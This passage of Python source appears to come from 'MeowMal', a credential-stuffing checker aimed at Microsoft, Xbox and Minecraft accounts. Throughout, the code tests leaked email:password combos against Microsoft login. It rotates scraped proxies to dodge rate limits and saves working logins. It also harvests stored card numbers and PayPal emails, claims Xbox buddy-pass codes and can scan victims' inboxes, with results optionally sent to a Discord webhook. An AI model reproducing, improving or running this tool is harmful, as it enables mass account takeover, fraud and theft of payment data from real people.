                        f.write(card_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'Card captured: {credit_card} ending {last4}')
                if paypal_email:
                    paypal_capture = f"{email}:{password} | PayPal: {paypal_email} | Holder: {fullname or 'N/A'}"
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
                        f.write(paypal_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'PayPal captured: {paypal_email}')
                payment += '\n============================\n'
                payment_methods += 1
                if UI_ENABLED and ui:
                    ui.log_payment(email, 'Payment methods found')
            break
        except Exception as e:
            retries += 1
            session.proxies = getproxy()
            time.sleep(2)
def validmail(email, password):
    global vm, cpm, checked
    vm += 1
    cpm += 1
    checked += 1
    with open(f'results/{fname}/Valid_Mail.txt', 'a') as file:
        file.write(f'{email}:{password}\n')
    meowapi_stats = ''
    try:
        username = email.split('@')[0]
        if username:
            stats = fetch_meowapi_stats(username)
            if stats:
                meowapi_stats = f' | MeowAPI: {stats}'
    except Exception:
        pass
    if UI_ENABLED and ui:
        ui.add_log(f'Valid Mail: {email}{meowapi_stats}', 'SUCCESS')
def capture_mc(access_token, session, email, password, type):
    global retries
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            pass
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=min(12 + (attempts - 1) * 2, 18))
            if r.status_code == 200:
                data = {}
                try:
                    data = r.json()
                except Exception:
                    data = {}
                name = data.get('name', 'N/A') or 'N/A'
                uuid = data.get('id', 'N/A') or 'N/A'
                try:
                    capes = ', '.join([cape.get('alias') for cape in data.get('capes', []) if cape.get('alias')])
                except Exception:
                    capes = ''
                CAPTURE = Capture(email, password, name, capes, uuid, access_token, type, session)
                CAPTURE.handle(session)
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(0.5 if len(proxylist) > 0 else 1)
                continue
            else:
                CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
                CAPTURE.handle(session)
                break
        except Exception:
            retries += 1
            session.proxies = getproxy()
            time.sleep(0.1)
            if attempts >= maxretries:
                try:
                    CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
                    CAPTURE.handle(session)
                except Exception:
                    pass
            continue
def checkownership(entitlements_response):
    items = entitlements_response.get('items', [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get('name', '')
        source = item.get('source', '')
        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
            has_normal_minecraft = True
        if name == 'product_game_pass_pc':
            has_game_pass_pc = True
        if name == 'product_game_pass_ultimate':
            has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc:
        return 'Normal Minecraft (with Game Pass)'
    if has_normal_minecraft and has_game_pass_ultimate:
        return 'Normal Minecraft (with Game Pass Ultimate)'
    elif has_normal_minecraft:
        return 'Normal Minecraft'
    elif has_game_pass_ultimate:
        return 'Xbox Game Pass Ultimate'
    elif has_game_pass_pc:
        return 'Xbox Game Pass (PC)'
def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other, config
    acctype = None
    attempts = 0
def claim_buddypass_offers(session, xbox_token, fname):
    global retries
    codes = []
    try:
        xsts = None
        for _ in range(maxretries):
            try:
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        js = xsts.json()
        if 'DisplayClaims' not in js or 'xui' not in js['DisplayClaims']: return
        uhss = js['DisplayClaims']['xui'][0]['uhs']
        xsts_token = js.get('Token')
        headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
        
        r = None
        for _ in range(maxretries):
            try:
                r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    time.sleep(20)
                continue
        else:
            return

        if 'offerid' in r.text.lower():
            offers = r.json()['offers']
            current_time = datetime.now(timezone.utc)
            for offer in offers:
                codes.append(offer['offerId'])
            
            if len(offers) < 5:
                for _ in range(3):
                    try:
                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                        if 'offerId' in r.text:
                            offers = r.json()['offers']
                            current_time = datetime.now(timezone.utc)
                            valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                            
                            for offer in valid_offer_ids:
                                write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                
                            shouldContinue = False
                            for offer in offers:
                                if offer['offerId'] not in codes:
                                    shouldContinue = True
                            for offer in offers:
                                codes.append(offer['offerId'])
                            if not shouldContinue:
                                break
                        else:
                            break
                    except Exception:
                        retries += 1
                        session.proxies = getproxy()
                        if len(proxylist) == 0:
                            time.sleep(20)
                        continue
        else:
             for _ in range(3):
                try:
                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                    if 'offerId' in r.text:
                        offers = r.json()['offers']
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                        for offer in valid_offer_ids:
                            write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                        shouldContinue = False
                        for offer in offers:
                            if offer['offerId'] not in codes:
                                shouldContinue = True
                        for offer in offers:
                            codes.append(offer['offerId'])
                        if not shouldContinue:
                            break
                    else:
                        break
                except Exception:
                    retries += 1
                    session.proxies = getproxy()
                    if len(proxylist) == 0:
                        time.sleep(20)
                    continue
    except Exception:
        pass

def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other, config
    acctype = None
    attempts = 0
    max_time = time.time() + 45
    while attempts < maxretries and time.time() < max_time:
        attempts += 1
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
            if checkrq.status_code == 429:
                retries += 1
                session.proxies = getproxy()
                time.sleep(0.1 if len(proxylist) > 0 else 1)
                continue
            else:
                break
        except Exception as e:
            retries += 1
            if UI_ENABLED and ui:
                ui.log_error(f'Network error: {str(e)[:30]}')
            session.proxies = getproxy()
            time.sleep(0.1)
            continue
    if time.time() >= max_time:
        if UI_ENABLED and ui:
            ui.log_error(f'Timeout checking {email}')
        return False
    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if acctype is None:
            return False
        
        name, uuid_str, capes_list = 'N/A', 'N/A', []
        try:
            profilerq = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
            if profilerq.status_code == 200:
                p_data = profilerq.json()
                name = p_data.get('name', 'N/A')
                uuid_str = p_data.get('id', 'N/A')
                capes_data = p_data.get('capes', [])
                for c in capes_data:
                    if c.get('alias'): capes_list.append(c['alias'])
        except:
            pass
            
        capes_str = ', '.join(capes_list)
        try:
             capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
             if 'Game Pass' not in acctype:
                 capture.handle(session)
        except Exception as e:
             if UI_ENABLED and ui: ui.log_error(f"Capture error: {e}")

        if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
            with stats_lock:
                xgpu += 1
            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
            claim_buddypass_offers(session, xbox_token, fname)
            capture_mc(token, session, email, password, acctype)
            return True
        elif acctype == 'Xbox Game Pass (PC)' or acctype == 'Normal Minecraft (with Game Pass)':
            with stats_lock:
                xgp += 1
            write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
            if 'Normal' in acctype:
                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
            claim_buddypass_offers(session, xbox_token, fname)
            try:
                capture_mc(token, session, email, password, acctype)
            except:
                pass
            return True
def mc_token(session, uhs, xsts_token):
    global retries
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy()
                time.sleep(0.5 if len(proxylist) > 0 else 2)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = getproxy()
            time.sleep(0.1)
            continue
    return None
RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
RE_URLPOST_VALUE = re.compile(r'"urlPost":"(.+?)"|urlPost:\'(.+?)\'|urlPost:"(.+?)"|<form.*?action=\\"(.+?)\\"', re.S)
RE_IPT = re.compile(r'(?<="ipt" value=").+?(?=">)')
RE_PPRID = re.compile(r'(?<="pprid" value=").+?(?=">)')
RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=">)')
RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=" )')
RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')

def create_optimized_session():
    session = requests.Session()
    session.verify = False
    
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
    
    pool_size = 4
    
    use_proxies = config.get('use_proxies', False)
    backoff = 2.5 if not use_proxies else 0.5
    retry_strategy = Retry(total=4, connect=4, read=4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
    adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    return session
def authenticate(email, password, use_optimized=False):
    global retries, bad, checked, cpm, twofa
    
    current_try = 0
    counters_incremented = False
    
    while current_try <= maxretries:
        try:
            session = create_optimized_session() if use_optimized else requests.Session()
            session.cookies.clear()
            
            try:
                if proxytype != "'4'":
                    proxy_config = getproxy()
                    if proxy_config:
                        session.proxies = proxy_config
                        if UI_ENABLED and ui:
                            ui.log_info(f'Using proxy for {email[:3]}***')
            except Exception as proxy_error:
                if UI_ENABLED and ui:
                    ui.log_error(f'Proxy error: {str(proxy_error)}')
            
            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
            if urlPost is None or sFTTag is None:
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_bad(email)
                if current_try >= maxretries:
                     return False
                return False

            token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
            
            if token == '2FA':
                twofa += 1
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_2fa(email)
                return False
                
            elif token == 'None' or token is None:
                if not counters_incremented:
                    if UI_ENABLED and ui:
                        ui.log_bad(email)
                return False
            
            if token != 'None' and token != '2FA':
                hit = False
                try:
                    xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                    js = xbox_login.json()
                    xbox_token = js.get('Token')
                    
                    if xbox_token != None:
                        uhs = js['DisplayClaims']['xui'][0]['uhs']
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                        
                        js = xsts.json()
                        xsts_token = js.get('Token')
                        
                        if xsts_token != None:
                            access_token = mc_token(session, uhs, xsts_token)
                            if access_token != None:
                                hit = checkmc(session, email, password, access_token, xbox_token)
                except Exception as e:
                    pass
                
                if config.get('payment') is True:
                    try:
                        payment(session, email, password)
                    except:
                        pass
                
                if check_microsoft_account and (config.get('check_microsoft_balance') or config.get('check_reward_points') or config.get('scan_inbox')):
                    try:
                        ms_results = check_microsoft_account(session, email, password, config.data, fname)
                    except:
                        pass
                
                if hit == False:
                    validmail(email, password)
                    counters_incremented = True
                else:
                    counters_incremented = True
                
                try:
                    session.close()
                except:
                    pass
                return bool(hit)
                
        except Exception as e:
            current_try += 1
            retries += 1
            if UI_ENABLED and ui and (current_try == 1):
                ui.log_error(f'[{email}] Auth exception: {type(e).__name__}, retrying...')
            
            try:
                session.close()
            except:
                pass
                
            if current_try > maxretries:
                 if not counters_incremented:
                    pass
                 if UI_ENABLED and ui:
                    ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
                    ui.log_bad(email)
                 return False

def fetch_proxies_from_api(proxy_type='http'):
    global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
    try:
        current_time = time.time()
        if last_proxy_fetch > 0 and current_time - last_proxy_fetch < proxy_time * 60:
            return True
        api_sources = []
        if proxy_api_url:
            api_sources = [proxy_api_url]
            print(f'{Fore.CYAN}[INFO] Using custom proxy API{Fore.RESET}')
        elif proxy_type == 'socks4':
            api_sources = api_socks4
            print(f'{Fore.CYAN}[INFO] Using free SOCKS4 proxy sources{Fore.RESET}')
        elif proxy_type == 'socks5':
            api_sources = api_socks5
            print(f'{Fore.CYAN}[INFO] Using free SOCKS5 proxy sources{Fore.RESET}')
        elif proxy_type == 'http':
            api_sources = api_http
            print(f'{Fore.CYAN}[INFO] Using free HTTP/HTTPS proxy sources{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}[WARNING] Unknown proxy type: {proxy_type}{Fore.RESET}')
            return False
        if not api_sources:
            return False
        print(f'\n{Fore.CYAN}[INFO] Fetching proxies from {len(api_sources)} API source(s)...{Fore.RESET}')
        all_proxies = []
        success_count = 0
        for idx, api_url in enumerate(api_sources, 1):
            try:
                print(f'{Fore.CYAN}[{idx}/{len(api_sources)}] Fetching from: {api_url[:60]}...{Fore.RESET}')
                response = requests.get(api_url, timeout=15)
                if response.status_code == 200:
                    new_proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                    if new_proxies:
                        all_proxies.extend(new_proxies)
                        success_count += 1
                        print(f'{Fore.GREEN}[✓] Fetched {len(new_proxies)} proxies{Fore.RESET}')
                    else:
                        print(f'{Fore.YELLOW}[⚠] No proxies returned{Fore.RESET}')
                else:
                    print(f'{Fore.RED}[✗] Status code: {response.status_code}{Fore.RESET}')
            except Exception as e:
                print(f'{Fore.RED}[✗] Failed: {str(e)[:50]}{Fore.RESET}')
                continue
        if all_proxies:
            all_proxies = list(set(all_proxies))
            if proxy_request_num > 0:
                all_proxies = all_proxies[:proxy_request_num]
            proxylist = all_proxies
            last_proxy_fetch = current_time
            print(f'{Fore.GREEN}[SUCCESS] Total: {len(proxylist)} unique proxies loaded from {success_count}/{len(api_sources)} sources{Fore.RESET}')
            print(f'{Fore.CYAN}[INFO] Next refresh in {proxy_time} minutes{Fore.RESET}')
            if UI_ENABLED and ui:
                ui.log_info(f'Fetched {len(proxylist)} {proxy_type} proxies from {success_count} API sources')
            return True
        else:
            print(f'{Fore.RED}[ERROR] No proxies fetched from any source{Fore.RESET}')
            return False
    except Exception as e:
        print(f'{Fore.RED}[ERROR] Failed to fetch proxies from API: {str(e)}{Fore.RESET}')
        return False

failed_proxies = set()
proxy_failure_count = {}
PROXY_FAILURE_THRESHOLD = 3
proxy_blacklist_lock = threading.Lock()

def mark_proxy_failed(proxy_str):
    global failed_proxies, proxy_failure_count
    if not proxy_str:
        return
    with proxy_blacklist_lock:
        if proxy_str not in proxy_failure_count:
            proxy_failure_count[proxy_str] = 0
        proxy_failure_count[proxy_str] += 1
        
        if proxy_failure_count[proxy_str] >= PROXY_FAILURE_THRESHOLD:
            failed_proxies.add(proxy_str)


def getproxy():
    global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
    proxy_protocol = 'http'
    if proxytype == "'2'":
        proxy_protocol = 'socks4'
    elif proxytype == "'3'":
        proxy_protocol = 'socks5'
    elif proxytype == "'4'":
        return {}
    if auto_proxy and len(proxylist) == 0:
        fetch_proxies_from_api(proxy_protocol)
    elif auto_proxy and last_proxy_fetch > 0 and (time.time() - last_proxy_fetch >= proxy_time * 60):
        fetch_proxies_from_api(proxy_protocol)
    if len(proxylist) > 0:
        available_proxies = [p for p in proxylist if p not in failed_proxies]
        
        if len(available_proxies) == 0 and len(proxylist) > 0:
            failed_proxies.clear()
            proxy_failure_count.clear()
            available_proxies = proxylist
        
        if len(available_proxies) > 0:
            proxy = random.choice(available_proxies)
        else:
            return {}
            
        if UI_ENABLED and ui:
            ui.log_info(f'Using proxy: {proxy[:10]}... ({proxy_protocol})')
        if proxytype == "'2'":
            protocol_prefix = 'socks4'
        elif proxytype == "'3'":
            protocol_prefix = 'socks5'
        else:
            protocol_prefix = 'http'
        try:
            if '@' in proxy:
                proxy_url = f'{protocol_prefix}://{proxy}'
                return {'http': proxy_url, 'https': proxy_url}
            parts = proxy.split(':')
            if len(parts) == 2:
                ip, port = parts
                proxy_url = f'{protocol_prefix}://{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            elif len(parts) == 4:
                ip, port, username, password = parts
                proxy_url = f'{protocol_prefix}://{username}:{password}@{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            elif len(parts) == 3 and ';' in parts[2]:
                ip, port, auth = parts
                user, password = auth.split(';', 1)
                proxy_url = f'{protocol_prefix}://{user}:{password}@{ip}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
            else:
                proxy_url = f'{protocol_prefix}://{proxy}'
                return {'http': proxy_url, 'https': proxy_url}
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Proxy format error: {str(e)}')
            return {}
    return {}
def Checker(combo):
    global bad, checked, cpm, hits, errors
    start_time = time.time()
    try:
        warn_threshold = int(config.get('slow_check_warn_seconds', 75))
    except Exception:
        warn_threshold = 75
    warn_on_slow = bool(config.get('warn_on_slow_check', False))
    try:
        combo = combo.strip()
        if not combo or ':' not in combo:
            with stats_lock:
                bad += 1
                checked += 1
                cpm += 1
            if UI_ENABLED and ui:
                ui.log_bad(combo.split(':')[0] if ':' in combo else combo)
                ui.log_info('Invalid combo format')
            return
        split = combo.split(':', 1)
        email = split[0].strip()
        password = split[1].strip() if len(split) > 1 else ''
        if not email or not password:
            with stats_lock:
                bad += 1
                checked += 1
                cpm += 1
            if UI_ENABLED and ui:
                ui.log_bad(email or 'empty')
                ui.log_info('Empty email or password')
            return
        result = False
        try:
            result = authenticate(str(email), str(password), use_optimized=True)
            if warn_on_slow and time.time() - start_time > warn_threshold:
                if UI_ENABLED and ui:
                    ui.add_log(f'Other: Slow check (> {warn_threshold}s): {email}', 'INFO')
        except TimeoutError:
            if UI_ENABLED and ui:
                ui.log_error(f'Account check taking too long: {email}')
            result = False
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Error checking {email}: {str(e)[:50]}')
            result = False
        with stats_lock:
            checked += 1
            cpm += 1
        if result:
            pass
        else:
            with stats_lock:
                bad += 1
            if UI_ENABLED and ui:
                ui.log_bad(email)
            if config.get('save_bad', False):
                with open(f'results/{fname}/Bads.txt', 'a') as f:
                    f.write(f'{email}:{password}\n')
    except Exception as e:
        with stats_lock:
            bad += 1
            checked += 1
            cpm += 1
            errors += 1
        if UI_ENABLED and ui:
            ui.log_bad(combo.split(':')[0] if ':' in combo else combo.strip())
            ui.log_error(f'Error: {str(e)[:50]}')
def logscreen():
    global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors
    total_combos = len(Combos)
    while checked < total_combos:
        cpm1 = cpm
        cpm = 0
        if checked > 0 and cpm1 == 0:
            cpm1 = checked
        try:
            title_stats = f"MeowMal by MeowMal Dev's | Checked: {checked}/{total_combos} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - Valid Mail: {vm} - Other: {other} - CPM: {cpm1 * 60} - Retries: {retries} - Errors: {errors}"
            utils.set_title(title_stats)
        except:
            pass
        if UI_ENABLED and ui:
            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm1 * 60, retries=retries, errors=errors)
            ui.show_ui_screen()
        time.sleep(1)


def load_proxy_file():
    global proxylist
    filename = None
    default_file = 'proxies.txt'
    if os.path.exists(default_file):
        print(f"✓ Found '{default_file}' in current directory!")
        try:
            use_default = input('Use this file? (Y/n): ').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        print('⚠ No proxy file found or selected.')
        try:
            filename = input('Load Proxy: ').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"✗ Invalid file path or file doesn't exist.")
        print('Continuing without proxies...')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        print(f'✓ [{len(proxylist)}] Proxies Loaded.')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
    except Exception as e:
        print(f'✗ Error reading proxy file: {str(e)}')
        time.sleep(0.5)
def Load():
    global Combos, fname
    filename = 'acc.txt'
    if not os.path.exists(filename):
        print(f"\n{Fore.RED}✗ 'acc.txt' not found in current directory.{Fore.RESET}")
        print(f"{Fore.YELLOW}Please create 'acc.txt' with your combos.{Fore.RESET}")
        time.sleep(3)
        return
    fname = os.path.splitext(os.path.basename(filename))[0]
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as e:
            lines = e.readlines()
            seen = set()
            unique_lines = []
            for line in lines:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
                        password = parts[1].strip()
                        dedupe_key = f'{email_lower}:{password}'
                        if dedupe_key not in seen:
                            seen.add(dedupe_key)
                            unique_lines.append(line)
            Combos = unique_lines
            dupes_removed = len(lines) - len(Combos)
            if dupes_removed > 0:
                try:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(unique_lines) + '\n')
                except:
                    pass
            print(f"\n{Fore.BLUE}{'=' * 60}")
            print(f'{Fore.CYAN}📄 File Statistics:')
            print(f'{Fore.BLUE}  • Duplicates Removed: {dupes_removed}')
            print(f'{Fore.BLUE}  • Valid Combos Loaded: {len(Combos)}')
            print(f"{Fore.BLUE}{'=' * 60}")
            if UI_ENABLED and ui:
                ui.log_info(f'Loaded {len(Combos)} combos ({dupes_removed} duplicates removed)')
            print(f'\n{Fore.CYAN}✓ File loaded successfully!{Fore.RESET}')
            time.sleep(3)
    except (IOError, OSError, MemoryError) as e:
        print(f'\n✗ Error reading combo file: {str(e)}')
        print('Please check the file and try again.')
        time.sleep(2)
        return
    except Exception as e:
        print(f'\n✗ Error reading file: {str(e)}')
        print(f'✗ Your file is probably corrupted or in wrong format.')
        time.sleep(2)
        return
def loadconfig():
    global maxretries, config
    def str_to_bool(value):
        if isinstance(value, bool):
            return value
        return str(value).lower() in ('yes', 'true', 't', '1', 'on')
    config_loader = ConfigLoader('config.ini')
    config_data = config_loader.get_general_config()
    checker_config = config_loader.get_checker_config()
    capture_config = config_loader.get_capture_config()
    maxretries = config_data.get('max_retries', 3)
    config.set('threads', config_data.get('threads', 10))
    config.set('max_retries', maxretries)
    config.set('timeout', config_data.get('timeout', 15))
    config.set('use_proxies', config_data.get('use_proxies', False))
    for key, value in checker_config.items():
        config.set(key, value)
    for key, value in capture_config.items():
        config.set(key, value)
    config.set('scan_inbox', config_data.get('scan_inbox', False))
    config.set('enable_notifications', config_loader.get('enable_notifications', False))
    config.set('discord_webhook_url', config_loader.get('discord_webhook_url', ''))
    config.set('webhook_username', config_loader.get('webhook_username', 'MeowMal Checker'))
    config.set('webhook_avatar_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
    config.set('notify_on_hit', config_loader.get('notify_on_hit', True))
    config.set('notify_on_game_pass', config_loader.get('notify_on_game_pass', True))
    config.set('notify_on_mfa', config_loader.get('notify_on_mfa', True))
    config.set('embed_thumbnail', config_loader.get('embed_thumbnail', True))
    config.set('embed_footer', config_loader.get('embed_footer', True))
    config.set('embed_thumbnail_url', config_loader.get('embed_thumbnail_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')))
    config.set('embed_image_enabled', config_loader.get('embed_image_enabled', True))
    config.set('embed_image_template', config_loader.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'))
    embed_color_hit = validate_hex_color(config_loader.get('embed_color_hit', '#57F287'))
    embed_color_xgp = validate_hex_color(config_loader.get('embed_color_xgp', '#3498DB'))
    config.set('embed_color_hit', embed_color_hit if embed_color_hit is not None else 5763719)
    config.set('embed_color_xgp', embed_color_xgp if embed_color_xgp is not None else 3447003)
    config.set('check_microsoft_balance', config_loader.get('check_microsoft_balance', False))
    config.set('check_rewards_points', config_loader.get('check_rewards_points', True))
    config.set('check_payment_methods', config_loader.get('check_payment_methods', True))
    config.set('check_subscriptions', config_loader.get('check_subscriptions', True))
    config.set('check_orders', config_loader.get('check_orders', True))
    config.set('check_billing_address', config_loader.get('check_billing_address', True))
    config.set('scan_inbox', config_loader.get('scan_inbox', True))
    config.set('inbox_keywords', config_loader.get('inbox_keywords', ''))
    proxy_config = config_loader.get_proxy_config()
    config.set('auto_proxy', proxy_config.get('auto_proxy', False))
    config.set('proxy_api', proxy_config.get('proxy_api', ''))
    config.set('request_num', proxy_config.get('request_num', 3))
    config.set('proxy_time', proxy_config.get('proxy_time', 5))
    config.set('show_live_logs', config_loader.get('show_live_logs', True))
    config.set('cui_theme', config_loader.get('theme', 'blue'))
    try:
        config.set('warn_on_slow_check', config_loader.get('warn_on_slow_check', False))
    except Exception:
        config.set('warn_on_slow_check', False)
    try:
        config.set('slow_check_warn_seconds', int(config_loader.get('slow_check_warn_seconds', 75)))
    except Exception:
        config.set('slow_check_warn_seconds', 75)
    config.set('optimize_network', config_loader.get('optimize_network', True))
    config.set('connection_pool_size', config_loader.get('connection_pool_size', 100))
    config.set('dns_cache_enabled', config_loader.get('dns_cache_enabled', True))
    config.set('keep_alive_enabled', config_loader.get('keep_alive_enabled', True))
    return True
def Main():
    global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
    utils.set_title("MeowMal by MeowMal Dev's")
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        if loadconfig():
            print(f'{Fore.GREEN}✓ Configuration loaded successfully{Fore.RESET}')
            if config.get('enable_notifications'):
                webhook_url = config.get('discord_webhook_url', '')
                if webhook_url and webhook_url.strip():
                    print(f'{Fore.GREEN}✓ Discord webhook configured{Fore.RESET}')
                else:
                    print(f'{Fore.YELLOW}⚠ Webhook enabled but no URL set{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}⚠ Using default configuration{Fore.RESET}')
        ui.config = config
    except Exception as e:
        print(f'{Fore.RED}Error loading configuration: {str(e)}{Fore.RESET}')
        print(f'{Fore.YELLOW}Using default settings{Fore.RESET}')
